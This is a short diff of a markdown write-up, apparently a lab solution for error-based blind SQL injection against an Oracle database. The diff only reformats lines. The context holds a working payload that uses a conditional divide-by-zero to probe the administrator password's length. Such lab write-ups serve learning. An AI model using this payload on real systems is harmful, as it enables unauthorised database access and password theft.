@@ -13,8 +13,10 @@
 123' union select CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and length(password)=20-- -
 ```
 => After checking , we discovered that the database is Oracle
+
 => Conditional in Oracle => `CASE WHEN (CONDITION) THEN TO_CHAR(1/0) ELSE '' END FROM table_name`
-TO_CHAR(1/0) is a divide-by-zero error => 500
+
+`TO_CHAR(1/0)` is a divide-by-zero error => 500
 
 ## Step 3 : Code bypass
 ```py
